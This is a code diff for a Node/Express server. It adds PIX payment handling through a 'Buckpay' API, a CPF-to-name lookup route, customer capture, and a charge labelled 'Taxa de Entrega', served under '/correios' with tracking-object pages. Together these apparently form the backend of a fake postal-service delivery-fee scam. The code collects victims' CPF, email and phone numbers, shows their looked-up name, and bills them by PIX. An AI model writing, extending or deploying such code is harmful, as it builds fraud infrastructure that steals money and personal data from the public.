@@ -3,7 +3,83 @@ import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
+// ---- Buckpay (inline, no external imports to keep the build minimal) ----
+const BUCKPAY_BASE = process.env.BUCKPAY_API_URL || 'https://api.realtechdev.com.br';
+
+function buckpayHeaders() {
+  const token = process.env.BUCKPAY_TOKEN || '';
+  if (!token) throw Object.assign(new Error('BUCKPAY_TOKEN nao configurado'), { status: 500 });
+  return {
+    Authorization: `Bearer ${token}`,
+    'User-Agent': process.env.BUCKPAY_USER_AGENT || 'Buckpay API',
+    'Content-Type': 'application/json',
+    Accept: 'application/json',
+  };
+}
+
+function amountToCents(amount) {
+  return Math.round(Number(amount) * 100);
+}
+
+function formatPhoneBr(phone) {
+  let digits = String(phone || '').replace(/\D/g, '');
+  if (!digits) return undefined;
+  if (!digits.startsWith('55')) digits = `55${digits}`;
+  if (digits.length >= 12 && digits.length <= 13) return digits;
+  return undefined;
+}
+
+function sanitizeExternalId(raw) {
+  const base = String(raw || '').replace(/[^a-zA-Z0-9_-]/g, '-').slice(0, 200);
+  const suffix = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
+  return `${base}-${suffix}`.slice(0, 255);
+}
+
+function qrCodeDataUri(base64) {
+  if (!base64) return '';
+  return base64.startsWith('data:') ? base64 : `data:image/png;base64,${base64}`;
+}
+
+function mapBuckpayStatus(status) {
+  if (status === 'paid') return 'paid';
+  if (status === 'cancelled' || status === 'canceled') return 'cancelled';
+  if (status === 'failed' || status === 'refused' || status === 'expired') return 'failed';
+  return 'pending';
+}
+
+async function createPixTransaction(payload) {
+  const r = await fetch(`${BUCKPAY_BASE}/v1/transactions`, {
+    method: 'POST',
+    headers: buckpayHeaders(),
+    body: JSON.stringify(payload),
+    signal: AbortSignal.timeout(28000),
+  });
+  const body = await r.json().catch(() => ({}));
+  if (!r.ok) {
+    const msg = body?.error?.message || body?.message || `BuckPay HTTP ${r.status}`;
+    throw Object.assign(new Error(msg), { status: r.status, body });
+  }
+  return body;
+}
+
+async function getTransactionById(id) {
+  const safeId = String(id || '').trim();
+  if (!safeId || !/^[a-zA-Z0-9-]+$/.test(safeId)) throw new Error('ID da transacao invalido');
+  const r = await fetch(`${BUCKPAY_BASE}/v1/transactions/${encodeURIComponent(safeId)}`, {
+    method: 'GET',
+    headers: buckpayHeaders(),
+    signal: AbortSignal.timeout(10000),
+  });
+  const body = await r.json().catch(() => ({}));
+  if (!r.ok) {
+    const msg = body?.error?.message || body?.message || `BuckPay HTTP ${r.status}`;
+    throw Object.assign(new Error(msg), { status: r.status, body });
+  }
+  return body;
+}
+
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const rootDir = __dirname;
 const app = express();
 
 const config = {
@@ -21,16 +97,15 @@ const config = {
   },
 };
 
-// Load templates once at startup — fails fast if files are missing
-const tplDir = __dirname;
-const indexHtml = stripTopPhp(fs.readFileSync(path.join(tplDir, 'index.php'), 'utf8'));
-const objetoHtml = stripTopPhp(fs.readFileSync(path.join(tplDir, 'objeto.php'), 'utf8'));
-const checkoutHtml = stripTopPhp(fs.readFileSync(path.join(tplDir, 'checkout.php'), 'utf8'));
-
 function stripTopPhp(src) {
   const m = src.match(/^<\?php[\s\S]*?\?>\s*/);
   return m ? src.slice(m[0].length) : src;
 }
+
+// Load templates once at startup — fails fast if files are missing
+const indexHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'index.php'), 'utf8'));
+const objetoHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'objeto.php'), 'utf8'));
+const checkoutHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'checkout.php'), 'utf8'));
 
 const sessions = new Map();
 
@@ -81,7 +156,8 @@ app.use((req, res, next) => {
   next();
 });
 
-app.get('/api.php', (req, res) => {
+// ---- CPF lookup ----
+function cpfLookup(req, res) {
   const cpf = normalizeCpf(req.query.cpf);
   const nonce = String(req.query.nonce || '');
   if (![config.cpf_lookup_nonce, config.checkout_cpf_nonce].includes(nonce))
@@ -91,9 +167,12 @@ app.get('/api.php', (req, res) => {
   return name
     ? res.json({ found: true, data: { NOME: name } })
     : res.json({ found: false, error: 'Nao foi possivel consultar este CPF agora' });
-});
+}
+app.get('/api.php', cpfLookup);
+app.get('/api/api', cpfLookup);
 
-app.post('/save_customer.php', (req, res) => {
+// ---- Save customer ----
+function saveCustomer(req, res) {
   if (req.body?.nonce !== config.customer_flow_nonce)
     return res.status(403).json({ success: false, error: 'Nonce invalido' });
   const cpf = normalizeCpf(req.body?.cpf);
@@ -106,7 +185,92 @@ app.post('/save_customer.php', (req, res) => {
     telefone: String(req.body?.telefone || '').replace(/\D/g, ''),
   };
   res.json({ success: true });
-});
+}
+app.post('/save_customer.php', saveCustomer);
+app.post('/api/save-customer', saveCustomer);
+
+// ---- Create PIX charge (Buckpay) ----
+async function createPix(req, res) {
+  const name = String(req.body?.name || '').trim();
+  const document = normalizeCpf(req.body?.document);
+  const email = String(req.body?.email || '').trim();
+  const telephone = String(req.body?.telephone || '').replace(/\D/g, '');
+
+  if (!isValidCpf(document) || name.length < 3 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || telephone.length < 10)
+    return res.status(422).json({ success: false, error: 'Payload invalido' });
+
+  const amountCents = amountToCents(config.amount);
+  if (amountCents < 600 || amountCents > 300000)
+    return res.status(422).json({ success: false, error: 'Valor invalido para a Buckpay' });
+
+  const externalId = sanitizeExternalId(req.body?.idempotency_key || `upsell-${document}`);
+  const phone = formatPhoneBr(telephone);
+  const tracking = req.body?.tracking && typeof req.body.tracking === 'object' ? req.body.tracking : {};
+
+  const buckpayPayload = {
+    external_id: externalId,
+    payment_method: 'pix',
+    amount: amountCents,
+    buyer: { name, email, document, ...(phone ? { phone } : {}) },
+    product: { id: String(req.body?.product_key || config.product_key), name: 'Taxa de Entrega' },
+    offer: { id: `${req.body?.product_key || config.product_key}-offer`, name: 'Taxa de Entrega', quantity: 1 },
+    tracking: {
+      utm_source: tracking.utm_source || null,
+      utm_medium: tracking.utm_medium || null,
+      utm_campaign: tracking.utm_campaign || null,
+      utm_content: tracking.utm_content || null,
+      utm_term: tracking.utm_term || null,
+      src: tracking.src || null,
+      ref: tracking.campaign || tracking.ref || null,
+      sck: tracking.click_id || tracking.sck || null,
+    },
+  };
+
+  try {
+    const result = await createPixTransaction(buckpayPayload);
+    const data = result.data || result;
+    const pix = data.pix || {};
+    return res.json({
+      success: true,
+      data: {
+        id: data.id,
+        external_id: externalId,
+        status_nonce: data.id,
+        brCode: pix.code || '',
+        pix: { qr_code: { data_uri: qrCodeDataUri(pix.qrcode_base64 || '') } },
+      },
+    });
+  } catch (error) {
+    const status = error.status && error.status < 500 ? error.status : 502;
+    return res.status(status).json({
+      success: false,
+      error: error.message || 'Erro ao gerar PIX na Buckpay',
+      details: error.body || null,
+    });
+  }
+}
+app.post('/api_pix_proxy.php', createPix);
+app.post('/api/pix', createPix);
+
+// ---- Payment status (Buckpay) ----
+async function paymentStatus(req, res) {
+  const reference = String(req.query.reference || '').trim();
+  if (!reference) return res.status(422).json({ success: false, error: 'Referencia invalida' });
+  try {
+    const result = await getTransactionById(reference);
+    const data = result.data || result;
+    const paid = mapBuckpayStatus(data.status) === 'paid';
+    return res.json({
+      success: true,
+      data: { paid, status: data.status || 'pending', thankYouUrl: 'checkout.php?paid=1' },
+    });
+  } catch (error) {
+    const status = error.status === 404 ? 404 : error.status && error.status < 500 ? error.status : 502;
+    return res.status(status).json({ success: false, error: error.message || 'Nao foi possivel consultar o pagamento' });
+  }
+}
+app.get('/api_payment_status_proxy.php', paymentStatus);
+app.get('/api/payment-status', paymentStatus);
 
 app.get('/objeto.php', (req, res) => {
   const cpf = normalizeCpf(req.query.cpf || req.session.customer?.cpf || '');
@@ -178,6 +342,11 @@ app.get(['/', '/correios', '/index.php'], (req, res) => {
   res.type('html').send(html);
 });
 
-app.use(express.static(path.join(__dirname, 'public'), { index: false }));
+app.use(express.static(path.join(rootDir, 'public'), { index: false }));
+
+const PORT = process.env.PORT;
+if (PORT) {
+  app.listen(PORT, () => console.log(`Servidor em http://localhost:${PORT}`));
+}
 
 export default app;
